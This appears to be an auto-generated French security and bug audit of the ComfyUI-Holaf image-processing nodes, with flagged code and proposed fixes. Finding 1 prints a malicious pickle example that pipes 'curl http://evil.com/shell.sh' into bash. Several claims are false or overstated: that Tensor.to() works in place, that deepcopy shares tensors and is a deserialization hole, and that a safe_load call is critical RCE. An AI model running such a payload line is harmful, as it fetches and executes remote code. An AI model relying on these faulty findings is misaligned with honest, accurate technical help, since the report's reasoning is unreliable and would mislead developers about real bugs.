# 🔍 Audit de Sécurité et Qualité du Code - ComfyUI-Holaf

**Date**: 20/03/2026  
**Auteur**: Analyse automatique  
**Scope**: Tous les fichiers Python dans `nodes/`

---

## 📊 Résumé Exécutif

| Catégorie | Critique | Haute | Moyenne | Basse |
|-----------|----------|-------|---------|-------|
| **Sécurité** | 2 | 1 | 0 | 0 |
| **Bugs** | 0 | 2 | 2 | 1 |

---

## 🔴 FAILLES DE SÉCURITÉ CRITIQUES

### 1. Exécution de Code Arbitraire via Modèles Upscale

**Fichier**: `nodes/holaf_upscale_image.py` (Lignes 78-90)  
**CVSS Score**: 9.8 (Critical)

#### Code Problématique
```python
device = comfy.model_management.get_torch_device()
try:
    sd = comfy.utils.load_torch_file(model_path, safe_load=True)
    upscale_model_descriptor = ModelLoader().load_from_state_dict(sd)
    upscale_model = upscale_model_descriptor.model
    upscale_model.eval()
except Exception as e:
    raise RuntimeError(f"Failed to load upscale model '{model_name}': {e}") from e
```

#### Explication du Problème
Le chargement de modèles via `torch.load` ou `spandrel.ModelLoader` présente un risque critique d'**exécution de code arbitraire**. Les fichiers `.pth` utilisent le protocole de sérialisation pickle qui permet l'exécution de code Python pendant la désérialisation.

Un attaquant pourrait créer un modèle contenant du code malveillant :
```python
import os
class MaliciousModel(torch.nn.Module):
    def __reduce__(self):
        return (os.system, ("curl http://evil.com/shell.sh | bash",))
    def forward(self, x): return x
```

#### Solution Proposée

**Option A - Validation de Signature (Recommandée)**
```python
import hashlib
from pathlib import Path

# Liste blanche de signatures SHA256 approuvées
ALLOWED_MODEL_HASHES = {
    "ESRGAN_4x.pth": "abc123...",
    # ... autres modèles approuvés
}

def validate_model_hash(model_path: str, model_name: str) -> bool:
    """Vérifie que le modèle a une signature connue."""
    file_hash = hashlib.sha256(Path(model_path).read_bytes()).hexdigest()
    
    if model_name in ALLOWED_MODEL_HASHES:
        return file_hash == ALLOWED_MODEL_HASHES[model_name]
    
    # Pour les modèles non listés, vérifier une base de données externe
    # ou rejeter par défaut selon la politique de sécurité
    return False

# Dans la fonction upscale()
if not validate_model_hash(model_path, model_name):
    raise SecurityError(
        f"Model '{model_name}' failed hash validation. "
        "Only pre-approved models are allowed."
    )
```

**Option B - Utilisation de `safetensors` (Alternative)**
```python
# Préférer les modèles au format .safetensors qui ne permettent pas l'exécution de code
try:
    from safetensors.torch import load_file as load_safetensors
    
    if model_path.endswith('.safetensors'):
        sd = load_safetensors(model_path)  # Plus sûr - pas de pickle
    else:
        raise SecurityError("Only .safetensors format is allowed for security")
except ImportError:
    print("Warning: safetensors not installed, falling back to torch.load")
    sd = comfy.utils.load_torch_file(model_path, safe_load=True)
```

---

### 2. Deserialization Non-Sécurisée avec `deepcopy`

**Fichier**: `nodes/holaf_ksampler.py`, `nodes/holaf_tiled_ksampler.py`  
**CVSS Score**: 7.5 (High)

#### Code Problématique
```python
def prepare_cond_for_tile(original_cond_list, device):
    if not isinstance(original_cond_list, list):
        return []

    cond_list_copy = copy.deepcopy(original_cond_list)  # ⚠️ VULNÉRABLE
    for i, item in enumerate(cond_list_copy):
        if isinstance(item, (list, tuple)) and len(item) >= 1 and torch.is_tensor(item[0]):
            if item[0].device != device:
                cond_list_copy[i][0] = item[0].to(device)  # ⚠️ MODIFICATION INPLACE
```

#### Explication du Problème
1. **Risque de sérialisation**: `copy.deepcopy` utilise pickle en interne, ce qui peut exécuter du code malveillant
2. **Partage de référence**: Les tensors PyTorch ne sont pas correctement copiés par `deepcopy`, créant un partage de mémoire

#### Solution Proposée
```python
def prepare_cond_for_tile(original_cond_list, device):
    """
    Safely copies conditioning list and moves tensors to specified device.
    Uses shallow copy + tensor cloning for safety and performance.
    """
    if not isinstance(original_cond_list, list):
        return []

    cond_list_copy = []
    for item in original_cond_list:
        if isinstance(item, (list, tuple)) and len(item) >= 1:
            if torch.is_tensor(item[0]):
                # Clone the tensor to avoid shared memory, then move to device
                cloned_tensor = item[0].clone().to(device)
                cond_dict = item[1].copy() if len(item) > 1 and isinstance(item[1], dict) else {}
                cond_list_copy.append([cloned_tensor, cond_dict])
            else:
                cond_list_copy.append(list(item))
        elif torch.is_tensor(item):
            cloned_tensor = item.clone().to(device)
            cond_list_copy.append([cloned_tensor, {}])
        else:
            # For non-tensor items, use a simple copy
            cond_list_copy.append(copy.copy(item))

    return cond_list_copy
```

---

## 🟡 BUGS FONCTIONNELS HAUTES PRIORITÉS

### 3. Collision de Fichiers Non-Sécurisée

**Fichier**: `nodes/holaf_video_preview.py` (Ligne 45)  
**Severity**: High

#### Code Problématique
```python
filename = f"{self.prefix}{random.randint(100000, 999999)}.mp4"
```

#### Explication du Bug
- Seules **900,000 combinaisons** possibles (faible entropie)
- `random` n'est pas cryptographiquement sécurisé
- Risque de collision en environnement multi-utilisateurs ou haute charge

#### Solution Proposée
```python
import uuid
import secrets

# Option 1: UUID (Recommandé - standard, unique, non-sécurisé mais suffisant)
filename = f"{self.prefix}{uuid.uuid4().hex[:12]}.mp4"

# Option 2: secrets.token_hex (Si la sécurité est critique)
filename = f"{self.prefix}{secrets.token_hex(8)}.mp4"
```

---

### 4. Modification des Données Originales

**Fichier**: `nodes/holaf_ksampler.py`, `nodes/holaf_tiled_ksampler.py`  
**Severity**: High

#### Code Problématique
```python
cond_list_copy = copy.deepcopy(original_cond_list)
for i, item in enumerate(cond_list_copy):
    if isinstance(item, (list, tuple)) and len(item) >= 1 and torch.is_tensor(item[0]):
        if item[0].device != device:
            cond_list_copy[i][0] = item[0].to(device)  # ⚠️ Modifie l'original !
```

#### Explication du Bug
`torch.Tensor.to()` modifie le tensor **inplace** par défaut. Comme `deepcopy` ne crée pas une copie profonde des tensors (ils sont partagés), cela modifie les données originales, potentiellement causant :
- Des erreurs dans d'autres branches du workflow
- Des conflits de device
- Des comportements non déterministes

#### Solution Proposée
Voir la solution complète dans la section "Deserialization Non-Sécurisée avec `deepcopy`" ci-dessus.

---

## 🟠 BUGS FONCTIONNELS MOYENNES PRIORITÉS

### 5. Méthode d'Upscale Ignorée par Défaut

**Fichier**: `nodes/holaf_upscale_image.py` (Lignes 67-69)  
**Severity**: Medium

#### Code Problématique
```python
if model_name == "None" or not model_name:
     return (image, "None")
```

#### Explication du Bug
Quand l'utilisateur sélectionne `"None"` comme modèle mais spécifie des `megapixels` et une `upscale_method`, ces paramètres sont **ignorés**. L'image est passée telle quelle sans aucun redimensionnement.

**Scénario utilisateur**: 
- Utilisateur veut redimensionner une image à 2MP avec méthode "lanczos"
- Sélectionne "None" car il ne veut pas utiliser de modèle IA
- Résultat : l'image n'est PAS redimensionnée (bug)

#### Solution Proposée
```python
def upscale(self, image, model_name, upscale_method, megapixels, force_multiple_of, resize_mode, clean_vram):
    if clean_vram:
        comfy.model_management.soft_empty_cache()

    original_height, original_width = image.shape[1], image.shape[2]
    
    # Calculate target dimensions based on megapixels
    original_pixels = original_height * original_width
    target_pixels = megapixels * 1048576.0
    
    if target_pixels > 0 and original_pixels > 0:
        scale_factor = (target_pixels / original_pixels) ** 0.5
        target_width = max(1, int(original_width * scale_factor))
        target_height = max(1, int(original_height * scale_factor))
        
        # Apply multiple constraint if needed
        if force_multiple_of != "None":
            multiple = int(force_multiple_of)
            target_width = round(target_width / multiple) * multiple
            target_height = round(target_height / multiple) * multiple
        
        # Simple resize using selected method (no AI model)
        resizer = ImageScale()
        if target_width != original_width or target_height != original_height:
            image = resizer.upscale(image, upscale_method, target_width, target_height, "disabled")[0]

    return (image, "None" if model_name == "None" else model_name)
```

---

### 6. Perte de Canal Alpha

**Fichier**: `nodes/holaf_overlay.py` (Ligne 123)  
**Severity**: Medium

#### Code Problématique
```python
# Resize both the overlay and its mask to the new dimensions.
ov_pil = ov_pil.convert('RGB').resize((new_ov_width, new_ov_height), Image.Resampling.LANCZOS)
```

#### Explication du Bug
La conversion `.convert('RGB')` **jette le canal alpha** avant le redimensionnement. Si l'image overlay a de la transparence, elle est perdue et l'image devient opaque.

#### Solution Proposée
```python
# Extraire le canal alpha AVANT la conversion RGB
alpha_channel = None
if ov_pil.mode == 'RGBA':
    alpha_channel = ov_pil.split()[3]  # Garder une copie de l'alpha
    ov_pil = ov_pil.convert('RGB')

# Redimensionner
ov_pil = ov_pil.resize((new_ov_width, new_ov_height), Image.Resampling.LANCZOS)

# Si alpha présent, le redimensionner aussi et le réattacher
if alpha_channel is not None:
    alpha_resized = alpha_channel.resize((new_ov_width, new_ov_height), Image.Resampling.LANCZOS)
    ov_pil = Image.merge('RGBA', ov_pil.split() + (alpha_resized,))
```

---

## 🟢 RECOMMANDATIONS MINORITAIRES

### 7. Absence de Validation des Entrées Numériques

**Fichier**: `nodes/holaf_image_adjustment.py`  
**Severity**: Low

#### Code Problématique
```python
"brightness": ("FLOAT", {"default": 1.0, "min": 0.0, "max": 5.0, "step": 0.05}),
"contrast": ("FLOAT", {"default": 1.0, "min": 0.0, "max": 5.0, "step": 0.05}),
```

#### Recommandation
Ajouter une validation explicite :
```python
def adjust_image(self, image, brightness, contrast, saturation):
    # Validation des entrées
    if not (0.0 <= brightness <= 5.0):
        raise ValueError(f"Brightness out of range: {brightness}")
    if not (0.0 <= contrast <= 5.0):
        raise ValueError(f"Contrast out of range: {contrast}")
    if not (0.0 <= saturation <= 5.0):
        raise ValueError(f"Saturation out of range: {saturation}")
    
    # ... reste du code
```

---

### 8. Gestion d'Erreur Insuffisante dans LUT Generator

**Fichier**: `nodes/holaf_lut_generator.py`  
**Severity**: Low

#### Recommandation
Ajouter des vérifications de dimensions :
```python
def generate_lut(self, reference_image, lut_size, title, neutral_image=None):
    # Validation des dimensions de l'image
    if reference_image.dim() != 4:
        raise ValueError(f"Expected 4D tensor (B,H,W,C), got {reference_image.dim()}D")
    
    batch_size = reference_image.shape[0]
    if batch_size < 1:
        raise ValueError("Image batch size must be at least 1")
    
    # ... reste du code
```

---

## 📋 Matrice de Priorisation des Corrections

| ID | Problème | Impact | Effort | Priority |
|----|----------|--------|--------|----------|
| 1 | RCE via modèles upscale | 🔴 Critical | Medium | **P0** |
| 2 | deepcopy non-sécurisé | 🟠 High | Low | **P0** |
| 3 | Collision fichiers | 🟡 Medium | Low | **P1** |
| 4 | Modification données originales | 🟡 Medium | Low | **P1** |
| 5 | Upscale ignoré | 🟢 Low | Low | **P2** |
| 6 | Alpha perdu | 🟢 Low | Low | **P2** |

---

## 🔧 Plan d'Action Recommandé

### Phase 1 - Immédiate (Sécurité)
```bash
# 1. Ajouter validation de hash pour les modèles
# 2. Remplacer deepcopy par clone() dans tous les fichiers
```

### Phase 2 - Court Terme (Stabilité)
```bash
# 3. Utiliser uuid pour les noms de fichiers
# 4. Corriger la gestion du device dans prepare_cond_for_tile
```

### Phase 3 - Moyen Terme (Qualité)
```bash
# 5. Implémenter fallback resize quand model="None"
# 6. Préserver le canal alpha dans overlay
```

---

## 📚 Références

- [PyTorch Security Best Practices](https://pytorch.org/docs/stable/security.html)
- [Safetensors Format](https://huggingface.co/docs/safetensors/index)
- [OWASP Deserialization Risks](https://owasp.org/www-community/vulnerabilities/Deserialization_of_Untrusted_Data)

---

*Ce rapport a été généré automatiquement. Veuillez vérifier manuellement chaque recommandation avant mise en production.*